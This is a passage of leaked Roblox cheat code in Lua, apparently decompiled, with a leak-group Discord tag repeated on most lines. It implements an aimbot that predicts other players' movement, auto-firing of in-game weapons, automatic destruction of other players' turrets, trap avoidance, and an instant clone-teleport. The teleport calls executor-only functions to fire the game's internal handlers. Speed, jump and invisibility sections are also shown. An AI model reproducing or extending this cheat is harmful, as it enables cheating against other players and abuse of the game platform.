			local function slicedfn14()
				if flag3 or not flag2 or not close.Parent or not open.Parent then
					return
				end
				flag3 = true

				pcall(function()
					close.Size = vector2  -- LEAKED BY SLICED | discord.gg/pubmethod
					close.CFrame = open.CFrame
					close.CanCollide = true
					close.CanTouch = false
				end)

				flag3 = false
			end

			slicedfn14()
			tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = close:GetPropertyChangedSignal("Size"):Connect(slicedfn14)
			tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = close:GetPropertyChangedSignal("CFrame"):Connect(slicedfn14)
			tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = close:GetPropertyChangedSignal("CanCollide"):Connect(slicedfn14)  -- LEAKED BY SLICED | discord.gg/pubmethod
			tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = close:GetPropertyChangedSignal("CanTouch"):Connect(slicedfn14)
			tbl4.PropertyConnections[#tbl4.PropertyConnections + 1] = open:GetPropertyChangedSignal("CFrame"):Connect(slicedfn14)
			local selectionBox = Instance.new("SelectionBox")
			selectionBox.Name = fn()
			selectionBox.Adornee = close
			selectionBox.Archivable = false
			selectionBox.Color3 = color
			selectionBox.LineThickness = lineThickness
			selectionBox.SurfaceTransparency = 1
			selectionBox.Transparency = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
			selectionBox.Parent = close
			tbl4.Outline = selectionBox

			tbl4.Connection = arg.AncestryChanged:Connect(function(child, parent)
				if not parent then
					slicedfn10(arg)
				end
			end)
		end

		local function slicedfn14()
			for _, child in ipairs(Workspace:GetChildren()) do  -- LEAKED BY SLICED | discord.gg/pubmethod
				if slicedfn8(child) then
					slicedfn13(child)
				end
			end
		end

		local function slicedfn15()
			flag2 = false

			if connection2 then
				connection2:Disconnect()
				connection2 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if connection then
				connection:Disconnect()
				connection = nil
			end

			slicedfn11()
		end

		local function slicedfn16()
			slicedfn15()
			flag2 = true  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn14()

			connection2 = Workspace.ChildAdded:Connect(function(child)
				if not flag2 or not slicedfn8(child) then
					return
				end

				task.defer(function()
					if flag2 and child.Parent then
						slicedfn13(child)
					end
				end)  -- LEAKED BY SLICED | discord.gg/pubmethod
			end)

			connection = localPlayer.CharacterAdded:Connect(function()
				if flag2 then
					task.defer(slicedfn14)
				end
			end)
		end

		slicedfn2(slicedfn15)

		sliced10:CreateToggle({
			Name = "Anti Trap",  -- LEAKED BY SLICED | discord.gg/pubmethod
			Default = true,
			Callback = function(arg)
				if arg then
					slicedfn16()
				else
					slicedfn15()
				end
			end,
		})
	end  -- LEAKED BY SLICED | discord.gg/pubmethod

	do
		local flag2 = false
		local slicedn3 = 0
		local connection = nil
		local tbl3 = {}
		local tbl4 = {}
		local sliced12 = nil
		local sliced13 = nil
		local slicedn4 = 0
		local str = "Sentry_" .. tostring(localPlayer.UserId)  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn8(arg)
			local isModel

			if arg then
				isModel = arg:IsA("Model") or arg:IsA("BasePart")
			else
				isModel = arg
			end

			return isModel and arg.Name:match("^Sentry_") ~= nil and arg.Name ~= str
		end

		local function slicedfn9(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			if arg:IsA("BasePart") then
				return arg
			end
			return arg:FindFirstChildWhichIsA("BasePart", true)
		end

		local function slicedfn10(arg)
			return arg:FindFirstChild("SetupReady", true) ~= nil
		end

		local function slicedfn11(arg)
			arg = arg and arg:FindFirstChildWhichIsA("Tool")  -- LEAKED BY SLICED | discord.gg/pubmethod
			if arg and arg.Name:lower():find("bat", 1, true) then
				return arg
			end
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			if not backpack then
				return nil
			end

			for _, child in ipairs(backpack:GetChildren()) do
				if child:IsA("Tool") and child.Name:lower():find("bat", 1, true) then
					return child  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end

			return nil
		end

		local function slicedfn12()
			local sliced14 = sliced12
			local sliced15 = sliced13
			sliced12 = nil
			sliced13 = nil
			if not sliced14 or not sliced14.Parent then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			if not character_ or not humanoid or humanoid.Health <= 0 or sliced14.Parent ~= character_ and sliced14.Parent ~= backpack then
				return
			end
			local tool = character_:FindFirstChildWhichIsA("Tool")
			if tool == sliced14 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end

			if tool and tool ~= sliced15 then
				return
			end

			pcall(function()
				slicedfn3(0.5)
				humanoid:EquipTool(sliced14)
			end)
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn13()
			return localPlayer:GetAttribute("Stealing") == true or localPlayer:GetAttribute("ChilliTpMoving") == true or localPlayer:GetAttribute("Teleporting") == true
		end

		local function slicedfn14(arg)
			if not tbl4[arg] then
				tbl4[arg] = { CanCollide = arg.CanCollide, Transparency = arg.Transparency, Size = arg.Size }
			end

			arg.CanCollide = false
			arg.Transparency = 1
			arg.Size = Vector3.new(10, 10, 10)  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn15()
			for k, sliced14 in pairs(tbl4) do
				if k and k.Parent then
					pcall(function()
						k.CanCollide = sliced14.CanCollide
						k.Transparency = sliced14.Transparency
						k.Size = sliced14.Size
					end)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			tbl4 = {}
		end

		local function slicedfn16()
			if slicedfn13() then
				return
			end
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not humanoid or humanoid.Health <= 0 or not humanoidRootPart then
				return
			end
			local sliced14 = nil
			local huge = math.huge
			local sliced15 = nil

			for k in pairs(tbl3) do
				if not k.Parent then
					tbl3[k] = nil
				elseif slicedfn10(k) then  -- LEAKED BY SLICED | discord.gg/pubmethod
					local sliced16 = slicedfn9(k)

					if sliced16 then
						local magnitude = (humanoidRootPart.Position - sliced16.Position).Magnitude

						if magnitude < huge then
							sliced14 = sliced16
							huge = magnitude
							sliced15 = k
						end
					end
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if not sliced15 or not sliced15.Parent or not sliced14 or not sliced14.Parent then
				return
			end

			pcall(function()
				slicedfn14(sliced14)
				sliced14.CFrame = humanoidRootPart.CFrame
			end)

			local sliced16 = slicedfn11(character_)
			if not sliced16 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end

			if sliced16.Parent ~= character_ then
				local tool = character_:FindFirstChildWhichIsA("Tool")

				if tool and tool ~= sliced16 and not sliced12 then
					sliced12 = tool
				end

				sliced13 = sliced16

				pcall(function()
					slicedfn3(1)  -- LEAKED BY SLICED | discord.gg/pubmethod
					humanoid:EquipTool(sliced16)
				end)
			end

			if sliced16.Parent == character_ then
				slicedn4 = os.clock()

				pcall(function()
					sliced16:Activate()
				end)
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn17()
			flag2 = false
			slicedn3 += 1
			slicedn4 = 0
			slicedfn12()

			if connection then
				connection:Disconnect()
				connection = nil
			end

			tbl3 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn15()
		end

		local function slicedfn18()
			slicedfn17()
			flag2 = true
			slicedn3 += 1
			local sliced14 = slicedn3

			for _, descendant in ipairs(Workspace:GetDescendants()) do
				if slicedfn8(descendant) then
					tbl3[descendant] = true  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end

			connection = Workspace.DescendantAdded:Connect(function(descendant)
				if flag2 and slicedfn8(descendant) then
					tbl3[descendant] = true
				end
			end)

			slicedfn16()

			task.spawn(function()
				local sliced15 = slicedn4  -- LEAKED BY SLICED | discord.gg/pubmethod

				while flag2 and slicedn3 == sliced14 and flag do
					if not slicedfn13() then
						local character_ = localPlayer.Character
						local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
						local humanoidRootPart = character_ and character_:FindFirstChild("HumanoidRootPart")

						if humanoid and humanoid.Health > 0 and humanoidRootPart then
							local sliced16 = nil
							local huge = math.huge
							local sliced17 = nil

							for k in pairs(tbl3) do  -- LEAKED BY SLICED | discord.gg/pubmethod
								if not k.Parent then
									tbl3[k] = nil
								elseif slicedfn10(k) then
									local sliced18 = slicedfn9(k)

									if sliced18 then
										local magnitude = (humanoidRootPart.Position - sliced18.Position).Magnitude

										if magnitude < huge then
											sliced16 = sliced18
											huge = magnitude
											sliced17 = k  -- LEAKED BY SLICED | discord.gg/pubmethod
										end
									end
								end
							end

							if sliced17 and sliced17.Parent and sliced16 and sliced16.Parent then
								pcall(function()
									slicedfn14(sliced16)
									sliced16.CFrame = humanoidRootPart.CFrame
								end)

								local now = os.clock()  -- LEAKED BY SLICED | discord.gg/pubmethod

								if now - sliced15 >= 0.01 then
									local sliced18 = slicedfn11(character_)

									if sliced18 then
										if sliced18.Parent ~= character_ then
											local tool = character_:FindFirstChildWhichIsA("Tool")

											if tool and tool ~= sliced18 and not sliced12 then
												sliced12 = tool
											end

											sliced13 = sliced18

											pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
												slicedfn3(1)
												humanoid:EquipTool(sliced18)
											end)
										end

										if sliced18.Parent == character_ then
											pcall(function()
												sliced18:Activate()
											end)
										end
									end  -- LEAKED BY SLICED | discord.gg/pubmethod

									sliced15 = now
								end
							else
								slicedfn12()
							end
						end
					else
						slicedfn12()
					end

					task.wait()  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end)
		end

		slicedfn2(slicedfn17)

		sliced10:CreateToggle({
			Name = "Auto Destroy Turrets",
			Default = true,
			Callback = function(arg)
				if arg then
					slicedfn18()  -- LEAKED BY SLICED | discord.gg/pubmethod
				else
					slicedfn17()
				end
			end,
		})
	end

	do
		local slicedn3 = 0.6
		local slicedn4 = 2
		local slicedn5 = 0.2  -- LEAKED BY SLICED | discord.gg/pubmethod
		local slicedn6 = 0.6
		local slicedn7 = 1.5
		local flag2 = false

		local function slicedfn8()
			local character_ = localPlayer.Character
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			return character_ and character_:FindFirstChild("Quantum Cloner") or backpack and backpack:FindFirstChild("Quantum Cloner")
		end

		local function slicedfn9(arg)
			local character_ = localPlayer.Character  -- LEAKED BY SLICED | discord.gg/pubmethod
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not character_ or not backpack or not humanoid or humanoid.Health <= 0 then
				return false
			end
			slicedfn3(5)

			for _, child in ipairs(character_:GetChildren()) do
				if child:IsA("Tool") and child ~= arg then
					pcall(function()
						child:Deactivate()  -- LEAKED BY SLICED | discord.gg/pubmethod
					end)

					child.Parent = backpack
				end
			end

			if arg.Parent ~= character_ then
				humanoid:EquipTool(arg)
			end

			local now = os.clock()

			while arg.Parent ~= character_ and os.clock() - now < 0.5 do
				RunService.Heartbeat:Wait()  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			return arg.Parent == character_
		end

		local function slicedfn10(arg, arg2)
			if not arg or not arg.Parent then
				return
			end
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local backpack = localPlayer:FindFirstChildOfClass("Backpack")  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not character_ or not humanoid or humanoid.Health <= 0 or arg.Parent ~= character_ and arg.Parent ~= backpack then
				return
			end
			local tool = character_:FindFirstChildWhichIsA("Tool")
			if tool == arg then
				return
			end

			if tool and tool ~= arg2 then
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			pcall(function()
				slicedfn3(0.5)
				humanoid:EquipTool(arg)
			end)
		end

		local function slicedfn11(arg, arg2, arg3)
			local magnitude = (arg2 - arg3).Magnitude
			local now = os.clock()

			repeat
				local slicedn8 = os.clock() - now  -- LEAKED BY SLICED | discord.gg/pubmethod
				local character_ = localPlayer.Character
				character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
				local humanoidRootPart = arg and arg.Parent and arg:FindFirstChild("HumanoidRootPart")
				if slicedn8 >= slicedn5 and (character_ and (character_.Position - arg3).Magnitude <= slicedn7) and (not arg or not arg.Parent or humanoidRootPart and (humanoidRootPart.Position - arg2).Magnitude <= slicedn7) then
					return true
				end

				if magnitude <= slicedn7 and slicedn8 >= slicedn6 then
					return true
				end
				RunService.Heartbeat:Wait()  -- LEAKED BY SLICED | discord.gg/pubmethod
			until os.clock() - now >= slicedn4

			return false
		end

		local function slicedfn12()
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			local toolsFrames = playerGui and playerGui:FindFirstChild("ToolsFrames")
			toolsFrames = toolsFrames and toolsFrames:FindFirstChild("QuantumCloner")
			local teleportToClone = toolsFrames and toolsFrames:FindFirstChild("TeleportToClone")
			if not teleportToClone then
				return nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			local ok, result = pcall(function()
				return getconnections(teleportToClone.MouseButton1Up)
			end)

			if not ok or type(result) ~= "table" then
				return nil
			end

			for _, sliced12 in ipairs(result) do
				local function_ = sliced12.Function
				function_ = function_ and debug.getinfo(function_) or nil  -- LEAKED BY SLICED | discord.gg/pubmethod
				function_ = function_ and function_.source or ""
				if sliced12.Enabled and type(sliced12.Fire) == "function" and string.find(function_, "QuantumClonerScript", 1, true) then
					return sliced12
				end
			end
		end

		sliced10:CreateButton({
			Name = "Instant Clone Swap",
			ButtonText = "Swap",
			Callback = function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				if flag2 then
					return false
				end
				flag2 = true
				local character_ = localPlayer.Character
				character_ = character_ and character_:FindFirstChildWhichIsA("Tool")
				local quantumCloner = slicedfn8()

				if not quantumCloner then
					local sliced12
					quantumCloner, sliced12 = slicedfn5("Quantum Cloner")  -- LEAKED BY SLICED | discord.gg/pubmethod

					if not quantumCloner then
						slicedfn6("Quantum Cloner", sliced12)
						flag2 = false
						return false
					end
				end

				if character_ == quantumCloner then
					character_ = nil
				end

				if not quantumCloner or not quantumCloner:IsA("Tool") or not slicedfn9(quantumCloner) then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn10(character_, quantumCloner)
					flag2 = false
					return false
				end

				local sliced12 = slicedfn12()

				if not sliced12 then
					slicedfn10(character_, quantumCloner)
					flag2 = false
					return false
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				local str = tostring(localPlayer.UserId) .. "_Clone"
				local sliced13 = Workspace:FindFirstChild(str)
				local sliced14 = nil
				local now = os.clock()

				local connection = Workspace.ChildAdded:Connect(function(child)
					if child.Name == str and child ~= sliced13 then
						sliced14 = child
					end
				end)

				local ok  -- LEAKED BY SLICED | discord.gg/pubmethod

				while true do
					if not sliced14 then
						pcall(function()
							quantumCloner:Activate()
						end)

						local sliced15 = Workspace:FindFirstChild(str)

						if sliced15 and sliced15 ~= sliced13 then
							sliced14 = sliced15
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					local humanoidRootPart = sliced14 and sliced14:FindFirstChild("HumanoidRootPart")

					if humanoidRootPart then
						local humanoidRootPart2 = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
						humanoidRootPart2 = humanoidRootPart2 and humanoidRootPart2.Position
						local position = humanoidRootPart.Position

						ok = pcall(function()
							sliced12:Fire()
						end)

						if ok and humanoidRootPart2 then
							slicedfn11(sliced14, humanoidRootPart2, position)  -- LEAKED BY SLICED | discord.gg/pubmethod
						end

						break
					else
						RunService.Heartbeat:Wait()
						ok = false
						if not (os.clock() - now >= slicedn3) then
							continue
						end
					end

					break  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				connection:Disconnect()
				slicedfn10(character_, quantumCloner)
				flag2 = false
				return ok
			end,
		})
	end

	do
		local slicedn3 = 0.05  -- LEAKED BY SLICED | discord.gg/pubmethod
		local slicedn4 = 0.05
		local slicedn5 = 200

		local tbl3 = {
			["Web Slinger"] = true,
			["Taser Gun"] = true,
			["Laser Cape"] = true,
			["Paintball Gun"] = true,
		}

		local PlayerMouse = require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("PlayerMouse"))
		local flag2 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
		local flag3 = false
		local slicedn6 = 0
		local flag4 = false
		local slicedn7 = 0
		local flag5 = false
		local hit = nil
		local target = nil
		local sliced12 = nil
		local slicedn8 = 0
		local slicedn9 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
		local slicedn10 = 0
		local obj2 = setmetatable({}, { __mode = "k" })
		local connection = nil

		local function slicedfn8()
			if flag5 then
				return
			end
			flag5 = true
			hit = PlayerMouse.Hit
			target = PlayerMouse.Target  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn9(arg)
			local character_ = arg.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")

			if character_ then
				character_ = character_:FindFirstChild("HumanoidRootPart") or character_:FindFirstChild("UpperTorso") or character_:FindFirstChild("Torso")
			end

			if humanoid and humanoid.Health > 0 and character_ then
				return humanoid, character_
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn10()
			local character_ = localPlayer.Character
			if not character_ then
				return nil
			end

			for k in pairs(tbl3) do
				local sliced13 = character_:FindFirstChild(k)
				if sliced13 and sliced13:IsA("Tool") then
					return sliced13  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end
		end

		local function slicedfn11()
			local sliced13, sliced14 = slicedfn9(localPlayer)
			if not sliced14 then
				return nil
			end
			local sliced15 = nil
			local sliced16 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod

			for _, player in ipairs(Players:GetPlayers()) do
				if player ~= localPlayer then
					local sliced17, sliced18 = slicedfn9(player)

					if sliced18 then
						local magnitude = (sliced18.Position - sliced14.Position).Magnitude

						if not sliced15 or magnitude < sliced15 then
							sliced15 = magnitude
							sliced16 = sliced18
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end

			return sliced16
		end

		local function slicedfn12(arg)
			local now = os.clock()

			if arg or not sliced12 or not sliced12.Parent or now - slicedn8 >= slicedn3 then
				slicedn8 = now
				sliced12 = slicedfn11()
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			return sliced12
		end

		local function slicedfn13(arg)
			local muzzle = obj2[arg]

			if not muzzle or not muzzle.Parent then
				muzzle = arg:FindFirstChild("Muzzle", true) or arg:FindFirstChild("FirePoint", true) or arg:FindFirstChild("Handle")
				obj2[arg] = muzzle
			end

			if muzzle then
				if muzzle:IsA("Attachment") then  -- LEAKED BY SLICED | discord.gg/pubmethod
					return muzzle.WorldPosition
				end

				if muzzle:IsA("BasePart") then
					return muzzle.Position
				end
			end

			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("HumanoidRootPart")
			return character_ and character_.Position
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn14()
			local now = os.clock()
			if now < slicedn10 then
				return slicedn9
			end
			slicedn10 = now + 0.5

			local ok, result = pcall(function()
				return localPlayer:GetNetworkPing()
			end)

			if ok and type(result) == "number" then  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedn9 = math.clamp(result, 0, 0.35)
			end

			return slicedn9
		end

		local function slicedfn15(arg, arg2)
			local slicedn11 = slicedn5 * slicedn5
			local slicedn12 = arg2:Dot(arg2) - slicedn11
			local slicedn13 = 2 * arg:Dot(arg2)
			local sliced13 = arg:Dot(arg)
			local slicedn14  -- LEAKED BY SLICED | discord.gg/pubmethod

			if math.abs(slicedn12) < 0.0001 then
				slicedn14 = nil

				if math.abs(slicedn13) > 0.0001 then
					slicedn14 = -sliced13 / slicedn13
					local sliced14 = nil

					if not (slicedn14 > 0) then
						slicedn14 = sliced14
					end
				end
			else  -- LEAKED BY SLICED | discord.gg/pubmethod
				local slicedn15 = slicedn13 * slicedn13 - 4 * slicedn12 * sliced13
				slicedn14 = nil

				if slicedn15 >= 0 then
					local sliced14 = math.sqrt(slicedn15)
					local slicedn16 = (-slicedn13 - sliced14) / (2 * slicedn12)
					local slicedn17 = (-slicedn13 + sliced14) / (2 * slicedn12)

					if slicedn16 > 0 and slicedn17 > 0 then
						slicedn14 = math.min(slicedn16, slicedn17)
					elseif slicedn16 > 0 then
						slicedn14 = slicedn16  -- LEAKED BY SLICED | discord.gg/pubmethod
					else
						slicedn14 = nil

						if slicedn17 > 0 then
							slicedn14 = slicedn17
						end
					end
				end
			end

			return math.clamp(slicedn14 or arg.Magnitude / slicedn5, 0, 3)
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn16(arg, arg2)
			local sliced13 = slicedfn13(arg)
			if not sliced13 then
				return arg2.Position
			end
			local assemblyLinearVelocity = arg2.AssemblyLinearVelocity
			local slicedn11 = arg2.Position + assemblyLinearVelocity * slicedfn14()
			return slicedn11 + assemblyLinearVelocity * slicedfn15(slicedn11 - sliced13, assemblyLinearVelocity)
		end

		local function slicedfn17(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced13 = slicedfn10()
			if not flag2 and not flag3 and not flag4 or not sliced13 then
				return false
			end
			local sliced14 = slicedfn12(arg)
			if not sliced14 then
				return false
			end
			local slicedn11

			if sliced13.Name == "Paintball Gun" then  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedn11 = slicedfn16(sliced13, sliced14)
			else
				slicedn11 = sliced14.Position + sliced14.AssemblyLinearVelocity * slicedn4
			end

			PlayerMouse.Hit = CFrame.new(slicedn11)
			PlayerMouse.Target = sliced14
			return true
		end

		local function slicedfn18()
			if not flag5 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return
			end
			flag5 = false
			sliced12 = nil
			slicedn8 = 0
			PlayerMouse.Hit = hit
			PlayerMouse.Target = target
			hit = nil
			target = nil
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn19()
			flag2 = false
			ContextActionService:UnbindAction("ChilliToolAimbotAction")

			pcall(function()
				RunService:UnbindFromRenderStep("ChilliToolAimbotRender")
			end)

			if connection then
				connection:Disconnect()
				connection = nil
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			if not flag3 and not flag4 then
				slicedfn18()
			end
		end

		local function slicedfn20()
			slicedfn19()
			flag2 = true

			ContextActionService:BindActionAtPriority("ChilliToolAimbotAction", function(arg, arg2)
				if arg2 == Enum.UserInputState.Begin and slicedfn10() then
					slicedfn17(true)  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				return Enum.ContextActionResult.Pass
			end, false, 10000, Enum.UserInputType.MouseButton1, Enum.UserInputType.Touch)

			connection = UserInputService.InputBegan:Connect(function(input)
				local userInputType = input.UserInputType

				if userInputType == Enum.UserInputType.MouseButton1 or userInputType == Enum.UserInputType.Touch then
					slicedfn17(true)
				end
			end)

			RunService:BindToRenderStep("ChilliToolAimbotRender", Enum.RenderPriority.Last.Value + 20, function()  -- LEAKED BY SLICED | discord.gg/pubmethod
				if slicedfn10() then
					slicedfn8()
					slicedfn17(false)
				elseif not flag3 and not flag4 then
					slicedfn18()
				end
			end)
		end

		local function slicedfn21()
			local character_ = localPlayer.Character  -- LEAKED BY SLICED | discord.gg/pubmethod
			character_ = character_ and character_:FindFirstChild("Paintball Gun")
			return character_ and character_:IsA("Tool") and character_ or nil
		end

		local function slicedfn22()
			flag3 = false
			slicedn6 += 1
			local sliced13 = slicedfn21()

			if sliced13 then
				pcall(function()
					sliced13:Deactivate()  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)
			end

			if not flag2 and not flag4 then
				slicedfn18()
			end
		end

		local function slicedfn23()
			slicedfn22()
			local paintballGun, sliced13 = slicedfn5("Paintball Gun")

			if not paintballGun then  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn6("Paintball Gun", sliced13)
			end

			flag3 = true
			slicedn6 += 1
			local sliced14 = slicedn6

			task.spawn(function()
				while flag3 and sliced14 == slicedn6 and flag do
					local sliced15 = slicedfn21()

					if sliced15 then
						slicedfn8()  -- LEAKED BY SLICED | discord.gg/pubmethod

						if slicedfn17(false) then
							pcall(function()
								sliced15:Activate()
							end)
						end
					elseif not flag2 and not flag4 then
						slicedfn18()
					end

					task.wait(0.04)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end)

			return true
		end

		local function slicedfn24()
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChild("Laser Cape")
			return character_ and character_:IsA("Tool") and character_ or nil
		end

		local function slicedfn25()
			flag4 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedn7 += 1
			local sliced13 = slicedfn24()

			if sliced13 then
				pcall(function()
					sliced13:Deactivate()
				end)
			end

			if not flag2 and not flag3 then
				slicedfn18()
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn26()
			slicedfn25()
			local laserCape, sliced13 = slicedfn5("Laser Cape")

			if not laserCape then
				slicedfn6("Laser Cape", sliced13)
			end

			flag4 = true
			slicedn7 += 1
			local sliced14 = slicedn7  -- LEAKED BY SLICED | discord.gg/pubmethod

			task.spawn(function()
				while flag4 and sliced14 == slicedn7 and flag do
					local sliced15 = slicedfn24()

					if sliced15 then
						slicedfn8()

						if slicedfn17(false) then
							pcall(function()
								sliced15:Activate()
							end)
						end  -- LEAKED BY SLICED | discord.gg/pubmethod
					elseif not flag2 and not flag3 then
						slicedfn18()
					end

					task.wait(0.04)
				end
			end)

			return true
		end

		slicedfn2(function()
			slicedfn25()  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn22()
			slicedfn19()
		end)

		sliced11:CreateToggle({
			Name = "Aimbot",
			Default = true,
			Callback = function(arg)
				if arg then
					slicedfn20()
				else  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn19()
				end
			end,
		})

		sliced11:CreateToggle({
			Name = "Auto Paintball",
			Note = "Automatically uses the Paintball Gun while equipped.",
			Default = true,
			Callback = function(arg)
				if arg then  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn23()
				else
					slicedfn22()
				end
			end,
		})

		sliced11:CreateToggle({
			Name = "Auto Laser Cape",
			Note = "Automatically uses the Laser Cape while equipped.",
			Default = false,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Callback = function(arg)
				if arg then
					slicedfn26()
				else
					slicedfn25()
				end
			end,
		})
	end

	local sliced12 = sliced9:CreateSection({ Name = "Speed Boost" })  -- LEAKED BY SLICED | discord.gg/pubmethod
	local sliced13 = sliced9:CreateSection({ Name = "Jump Boost" })
	sliced6 = sliced9:CreateSection({ Name = "Character" })
	sliced7 = sliced9:CreateSection({ Name = "Invisibility" })
	sliced8 = sliced9:CreateSection({ Name = "Respawn", Expanded = false })

	do
		local slicedn3 = 0.0083333333333333332
		local slicedn4 = 4
		local slicedn5 = 0.12
		local slicedn6 = 25
		local slicedn7 = 0.045  -- LEAKED BY SLICED | discord.gg/pubmethod
		local slicedn8 = 0.03
		local slicedn9 = 0.015
		local slicedn10 = 10
		local slicedn11 = 60
		local flag2 = false
		local connection = nil
		local connection2 = nil
		local connection3 = nil
		local connection4 = nil
		local connection5 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		local flag3 = false
		local humanoid = nil
		local humanoidRootPart = nil
		local flag4 = false
		local flag5 = false
		local slicedn12 = 0
		local slicedn13 = 0
		local slicedn14 = 0
		local slicedn15 = 0
		local slicedn16 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
		local slicedn17 = 60
		local slicedn18 = 19.1
		local flag6 = false
		local y = nil

		local function slicedfn8()
			return math.max(slicedn17 / slicedn11, 0.01)
		end

		local function slicedfn9()
			if not flag2 or not humanoidRootPart or not humanoidRootPart.Parent then
				return  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if UserInputService:GetFocusedTextBox() then
				return
			end
			y = y or humanoidRootPart.Position.Y
			if flag6 and humanoidRootPart.Position.Y - y >= slicedn18 then
				return
			end
			local sliced14 = slicedfn8()
			slicedn13 = slicedn11 * sliced14  -- LEAKED BY SLICED | discord.gg/pubmethod
			local slicedn19 = slicedn5 / sliced14
			slicedn12 = os.clock() + slicedn19
			flag5 = true
			slicedn15 = os.clock()
		end

		local function slicedfn10()
			if not humanoid or not humanoidRootPart or not humanoidRootPart.Parent then
				return
			end

			if humanoid.Health <= 0 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				flag4 = false
				flag5 = false
				return
			end

			local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
			local flag7 = humanoid.FloorMaterial ~= Enum.Material.Air
			local now = os.clock()
			local sliced14 = slicedfn8()

			if flag7 then
				y = humanoidRootPart.Position.Y  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			local flag8 = flag6 and (flag4 or flag5) and y and humanoidRootPart.Position.Y - y >= slicedn18

			if flag4 and not flag8 then
				if now - slicedn15 >= slicedn7 / sliced14 or flag5 and slicedn12 - now <= slicedn8 / sliced14 then
					slicedfn9()
				end
			end

			if flag8 then
				flag5 = false

				if assemblyLinearVelocity.Y > 0 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
				end
			elseif flag5 then
				if slicedn12 <= now then
					flag5 = false
				else
					local slicedn19 = (Workspace.Gravity * sliced14 * sliced14 - Workspace.Gravity) * slicedn3
